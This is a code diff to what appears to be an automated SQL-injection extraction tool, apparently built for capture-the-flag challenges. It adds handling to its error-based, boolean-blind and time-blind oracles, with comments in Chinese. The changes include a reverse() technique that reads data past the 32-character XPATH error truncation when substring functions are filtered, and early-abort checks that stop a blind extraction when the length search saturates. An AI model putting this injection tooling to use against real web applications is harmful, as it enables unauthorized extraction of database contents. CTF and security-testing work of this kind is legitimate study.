@@ -240,6 +240,7 @@ class ErrorOracle(BaseOracle):
 
     def scalar(self, expr: str) -> str:
         out, i = [], 1
+        truncated = False
         while True:
             chunk = self._chunk(expr, i)
             if not chunk:
@@ -247,8 +248,28 @@ class ErrorOracle(BaseOracle):
             out.append(chunk)
             if len(chunk) < self.CHUNK:
                 break
+            truncated = True
             i += self.CHUNK
-        return "".join(out)
+            if i > 4 * self.CHUNK:      # 报错通道只支持单段，避免死循环
+                break
+        val = "".join(out)
+        # 32 字符截断（XPATH 上限）且 substr 类被滤时，用 reverse() 读尾段
+        # 拼接（ctf2 #173 RCTF 实测：substr/mid/left/right 全被滤只剩 reverse）
+        if truncated and val:
+            try:
+                rev = self._chunk(f"reverse(({expr}))", 1)
+            except OracleError:
+                rev = ""
+            if rev:
+                tail = rev[::-1]
+                # 尾段与已读部分重叠，取最长可拼接后缀
+                for k in range(min(len(tail), len(val)), 0, -1):
+                    if tail[:k] == val[-k:]:
+                        val += tail[k:]
+                        break
+                else:
+                    val += tail
+        return val
 
 
 # ---------------------------------------------------------------------------
@@ -399,6 +420,10 @@ class BoolOracle(BaseOracle):
             return ""
         length = self._binsearch(
             lambda m: self._ge(f"length(({expr}))", f"{m}", f"{m - 1}"), 1, 1024)
+        if length > 500:
+            # 二分上限被撑满 = 报错页对每个 mid 都判真（表不存在/语法错），
+            # 早失败避免 64 块 × 数千请求的白烧（GYCTF Ezsqli 实测）
+            raise OracleError(f"长度异常（{length}），表达式无法求值（表/列不存在？）")
         self.s.log("INFO", f"[bool] 长度={length}，分块并发提取: {expr[:60]}")
         result = [""] * length
         BLOCK = 16
@@ -620,6 +645,8 @@ class TimeOracle(BaseOracle):
             return ""
         length = self._binsearch(
             lambda m: self._ge(f"length(({expr}))", f"{m}", f"{m - 1}"), 1, 512)
+        if length > 400:
+            raise OracleError(f"长度异常（{length}），表达式无法求值（表/列不存在？）")
         self.s.log("INFO", f"[time] 长度={length}，游程+分块提取: {expr[:60]}")
         store_key = f"time|{expr}"
         saved = self.progress.get(store_key) if self.progress else None
